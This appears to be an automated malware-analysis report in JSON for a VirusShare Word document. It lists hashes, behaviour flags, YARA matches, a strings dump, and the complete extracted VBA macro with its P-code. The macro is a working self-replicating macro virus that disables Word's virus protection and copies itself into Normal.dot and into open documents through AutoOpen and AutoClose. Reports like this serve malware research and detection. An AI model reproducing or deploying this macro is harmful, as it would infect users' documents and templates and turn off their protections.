{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code"
        },
        "macro": "Sub AutoClose()\nOn Error GoTo out\nOptions.VirusProtection = False\nOptions.SaveNormalPrompt = False\nOptions.ConfirmConversions = False\nIf Date > #5/20/00# Then\nEnd If\nad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines\nnt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines\nIf nt > 0 And nt < 3 Then NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines 1\nIf nt > 3 And ad > 3 Then GoTo out\nIf nt < 3 Then\n    Set host = NormalTemplate.VBProject.VBComponents.Item(1)\n    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name\n    ActiveDocument.VBProject.VBComponents.Item(1).Export \"c:\\class.sys\"\n    host.codemodule.AddFromFile (\"c:\\class.sys\")\n    With host.codemodule\n      For x = 1 To 4\n       .deletelines 1\n      Next x\n      .replaceline 1, \"Sub AutoClose()\"\n      .replaceline ad - 5, \"Sub ViewVBCode()\" '44\n      .replaceline ad - 2, \"Sub ToolsMacro()\" '47\n     End With\nEnd If\nIf ad < 3 Then\n Set host = ActiveDocument.VBProject.VBComponents.Item(1)\n NormalTemplate.VBProject.VBComponents.Item(1).Export \"c:\\class.sys\"\n host.codemodule.AddFromFile (\"c:\\class.sys\")\n With host.codemodule\n      For x = 1 To 4\n       .deletelines 1\n      Next x\n      .replaceline 1, \"Sub AutoOpen()\"\n      .replaceline nt - 5, \"Sub ViewVBCode1()\"\n      .replaceline nt - 2, \"Sub ToolsMacro1()\"\n     End With\nEnd If\nKill \"c:\\class.sys\"\nFor Each aTemp In Templates\n    If LCase(aTemp.Name) = \"Normal.dot\" Then aTemp.Save\nNext aTemp\nout:\nIf nt > 3 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd Sub\nSub ViewVBCode()\n'123\nEnd Sub\nSub ToolsMacro()\n'123\nEnd Sub\n\n' Processing file: VirusShare_416d3b38580889edfcb085f90ca5b181\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 8340 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoClose())\n' Line #1:\n' \tOnError out \n' Line #2:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #3:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #4:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #5:\n' \tLd Date \n' \tLitDate 0x0000 0x0000 0xE740 0x40E1 \n' \tGt \n' \tIfBlock \n' Line #6:\n' \tEndIfBlock \n' Line #7:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt ad \n' Line #8:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt nt \n' Line #9:\n' \tLd nt \n' \tLitDI2 0x0000 \n' \tGt \n' \tLd nt \n' \tLitDI2 0x0003 \n' \tLt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tArgsMemCall deletelines 0x0001 \n' \tEndIf \n' Line #10:\n' \tLd nt \n' \tLitDI2 0x0003 \n' \tGt \n' \tLd ad \n' \tLitDI2 0x0003 \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo out \n' \tEndIf \n' Line #11:\n' \tLd nt \n' \tLitDI2 0x0003 \n' \tLt \n' \tIfBlock \n' Line #12:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet host \n' Line #13:\n' \tLd host \n' \tMemLd New \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemSt New \n' Line #14:\n' \tLitStr 0x000C \"c:\\class.sys\"\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #15:\n' \tLitStr 0x000C \"c:\\class.sys\"\n' \tParen \n' \tLd host \n' \tMemLd codemodule \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #16:\n' \tStartWithExpr \n' \tLd host \n' \tMemLd codemodule \n' \tWith \n' Line #17:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tFor \n' Line #18:\n' \tLitDI2 0x0001 \n' \tArgsMemCallWith deletelines 0x0001 \n' Line #19:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000F \"Sub AutoClose()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #21:\n' \tLd ad \n' \tLitDI2 0x0005 \n' \tSub \n' \tLitStr 0x0010 \"Sub ViewVBCode()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' \tQuoteRem 0x002E 0x0002 \"44\"\n' Line #22:\n' \tLd ad \n' \tLitDI2 0x0002 \n' \tSub \n' \tLitStr 0x0010 \"Sub ToolsMacro()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' \tQuoteRem 0x002E 0x0002 \"47\"\n' Line #23:\n' \tEndWith \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' \tLd ad \n' \tLitDI2 0x0003 \n' \tLt \n' \tIfBlock \n' Line #26:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet host \n' Line #27:\n' \tLitStr 0x000C \"c:\\class.sys\"\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #28:\n' \tLitStr 0x000C \"c:\\class.sys\"\n' \tParen \n' \tLd host \n' \tMemLd codemodule \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #29:\n' \tStartWithExpr \n' \tLd host \n' \tMemLd codemodule \n' \tWith \n' Line #30:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tFor \n' Line #31:\n' \tLitDI2 0x0001 \n' \tArgsMemCallWith deletelines 0x0001 \n' Line #32:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #33:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000E \"Sub AutoOpen()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #34:\n' \tLd nt \n' \tLitDI2 0x0005 \n' \tSub \n' \tLitStr 0x0011 \"Sub ViewVBCode1()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #35:\n' \tLd nt \n' \tLitDI2 0x0002 \n' \tSub \n' \tLitStr 0x0011 \"Sub ToolsMacro1()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #36:\n' \tEndWith \n' Line #37:\n' \tEndIfBlock \n' Line #38:\n' \tLitStr 0x000C \"c:\\class.sys\"\n' \tArgsCall Kill 0x0001 \n' Line #39:\n' \tStartForVariable \n' \tLd aTemp \n' \tEndForVariable \n' \tLd Templates \n' \tForEach \n' Line #40:\n' \tLd aTemp \n' \tMemLd New \n' \tArgsLd LCase 0x0001 \n' \tLitStr 0x000A \"Normal.dot\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd aTemp \n' \tArgsMemCall Save 0x0000 \n' \tEndIf \n' Line #41:\n' \tStartForVariable \n' \tLd aTemp \n' \tEndForVariable \n' \tNextVar \n' Line #42:\n' \tLabel out \n' Line #43:\n' \tLd nt \n' \tLitDI2 0x0003 \n' \tGt \n' \tLd ad \n' \tLitDI2 0x0000 \n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #44:\n' \tEndSub \n' Line #45:\n' \tFuncDefn (Sub ViewVBCode())\n' Line #46:\n' \tQuoteRem 0x0000 0x0003 \"123\"\n' Line #47:\n' \tEndSub \n' Line #48:\n' \tFuncDefn (Sub ToolsMacro())\n' Line #49:\n' \tQuoteRem 0x0000 0x0003 \"123\"\n' Line #50:\n' \tEndSub \n"
    },
    "filename": "VirusShare_416d3b38580889edfcb085f90ca5b181",
    "filesize": 47104,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Author: Righard J. Zwienenberg, Template: Normal.dot, Last Saved By: Righard J. Zwienenberg, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Jul  2 18:29:00 2001, Last Saved Time/Date: Mon Jul  2 18:29:00 2001, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "416d3b38580889edfcb085f90ca5b181",
        "sha1": "5314e4ab372a862d59b6ee928d7d3d9c32da62f6",
        "sha256": "5d8c072af201bc0721d21fd9af176edb1ed2e684e0893cd9b4cd320f0c16eb21"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "besonderefallefr-SonicRed-15.04.2002",
            "712F17E3,41.254 VS051816.DOC",
            "besonderefallefr-SonicRed-15.04.2002",
            "1762C085,41.254 VS051816.DOC",
            "/ =!",
            "bjbj\u064e",
            "Righard J. Zwienenberg",
            "Normal.dot",
            "Righard J. Zwienenberg",
            "Microsoft Word 8.0",
            "Norman",
            "Title",
            "_PID_GUID",
            "3 An",
            "Docu",
            ".Ful",
            "c:\\class.sys",
            "c:\\class.sys",
            "Sub AutoClose()",
            "Sub ViewVBCode()C@T",
            "Sub ToolsMacro()C@T",
            "c:\\class.sys",
            "c:\\class.sys",
            "Sub AutoOpen()C@T",
            "l)\u0256 o",
            "k)\u0256 o",
            "k)\u0256 o",
            "l)\u0256 o",
            "Name",
            "Sub ViewVBCode1()",
            "Sub ToolsMacro1()",
            "c:\\class.sysA@,",
            "Normal.dot",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Sub Auto",
            "n Error ",
            "GoTo out",
            "\tptions.",
            "VirusProtec",
            "SaveNormDal",
            "C@onfirm",
            "ers*",
            "b > #5/",
            "20/00# T",
            "End@ If",
            ">ve.VB5",
            "Compo",
            "ns.Item",
            "(1).code",
            "module.C",
            "ountOfLines",
            "> 0 FA@*",
            "< 3. ",
            "deletel* 1",
            "=A>E",
            "Set hos:C",
            "rt \"c:",
            "\\ss.sys",
            "sAddFromFi(",
            "WithB?HQ",
            "%  F \\x`O1 \\4",
            "  Next xQ",
            ".remc3 01, \"lh",
            "`6- 5",
            "Vi ewVBC`S()\" '4",
            "ToolsMacroC",
            "@@?:ntg7 ",
            ".7_7lad=A76= 6@76bOpen*",
            "*6{y61",
            "illN^",
            "TEac",
            "h a In O\u0154R<LC(+",
            "Z\"C6.d8ot\"c",
            "`:0=",
            "m{:=",
            "Full~!",
            "'123#U",
            "@@]pH5h\\",
            "xD@<8",
            "xD@<8",
            "]cH'\\",
            "xD@<8",
            "]pH'\\",
            "]ch\\",
            "xD@<5h",
            "xD@<",
            "]ch\\I",
            "xD@<",
            "Qx[t",
            "]/H'\\c",
            "' '0'@'P'`''H",
            "hH`P@0 ",
            "73b40af8c",
            "d)\u0256 o",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Documentj",
            "AutoOpen*",
            "ViewVBCode1",
            "ToolsMacro1",
            "Options",
            "ActiveDocument\\",
            "ad~\\",
            "NormalTemplateq",
            "nto^",
            "host",
            "Kill",
            "aTemp0",
            "Templatesh",
            "LCase:",
            "Version",
            "CLASS",
            "BEGIN",
            "MultiUse",
            "outZ",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "codemodule",
            "CountOfLines!\\",
            "deletelines",
            "Export",
            "AddFromFileu",
            "replaceline",
            "Save",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "AutoClose",
            "ViewVBCode",
            "ToolsMacrou",
            "_B_var_Datev",
            "_B_var_ad&",
            "_B_var_nt",
            "_B_var_host",
            "_B_var_x",
            "_B_var_aTemp",
            "_B_var_LCase'",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\SYSTEM\\",
            "2.tlb#OL",
            "E Automa0tion",
            "MSFms>",
            "F99D",
            "09BC0-9D D4-11",
            "M20AFF11",
            "3.TW",
            "D#MicrosPoft ",
            "Object Library",
            "3,PJP\\VBE",
            "\\(EX(.E",
            "ACxOPfficDxO@ufP",
            "cBx+",
            ",2DF8D04",
            "C-5BFA-1",
            "01B-BDE5@xAA@w4",
            "PROGRAM ",
            "FILES\\MI",
            "CROSOFT ",
            "OFFICE 9",
            "2O97.",
            "[C$ 8.0R[",
            "This",
            "Document\"",
            "fT\"B",
            "b)\u0256 o",
            "Normal",
            "ThisDocument",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office 97\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\stdole2.tlb",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE 97\\OFFICE\\MSO97.DLL",
            "Office",
            "f)\u0256 o",
            "e)\u0256 o",
            "Document",
            "l)\u0256 o",
            "k)\u0256 o",
            "AutoClose",
            "ViewVBCode",
            "ToolsMacro",
            "VBA332.DLL",
            "Name",
            "c:\\class.sys",
            "codemodule",
            "AddFromFile",
            "deletelines",
            "Sub AutoClose()",
            "replaceline",
            "Sub ViewVBCode()",
            "Sub ToolsMacro()\t",
            "Sub AutoOpen()",
            "Sub ViewVBCode1()",
            "Sub ToolsMacro1()",
            "Normal.dot",
            "Save",
            "ThisDocument",
            "ID=\"{96C9296E-6F20-11D5-8830-0020AFF11EF0}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"8082353339333933393339\"",
            "DPB=\"0002B5B6B6B6B6B6\"",
            "GC=\"80823536363636C9\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            " PAGE ",
            "Attention:",
            "ATTN:",
            " AUTHOR ",
            "\tPage ",
            " PAGE ",
            " DATE ",
            "Best regards,",
            "Best wishes,",
            "CERTIFIED MAIL",
            "CONFIDENTIAL",
            "Confidential\tPage ",
            " PAGE ",
            " DATE ",
            "Cordially,",
            "Created by ",
            " AUTHOR ",
            "Created on ",
            " CREATEDATE ",
            "Dear Mom and Dad,",
            "Dear Sir or Madam:",
            " FILENAME ",
            " FILENAME \\p ",
            "In reply to:",
            "Ladies and Gentlemen:",
            "Last printed ",
            " PRINTDATE ",
            "Last saved by ",
            " LASTSAVEDBY ",
            "Love,",
            "Page ",
            " PAGE ",
            " of ",
            " NUMPAGES ",
            "PERSONAL",
            "Reference:",
            "Regards,",
            "REGISTERED MAIL",
            "Respectfully yours,",
            "Respectfully,",
            "Sincerely yours,",
            "Sincerely,",
            "SPECIAL DELIVERY",
            "Subject:",
            "Take care,",
            "Thank you,",
            "Thanks,",
            "To Whom It May Concern:",
            "VIA AIRMAIL",
            "VIA FACSIMILE",
            "VIA OVERNIGHT MAIL",
            "Yours truly,",
            "/ =!"
        ],
        "file": {
            "1762C085,41.254 VS051816.DOC": "Word",
            "712F17E3,41.254 VS051816.DOC": "Word",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE 97\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office 97\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.321194",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
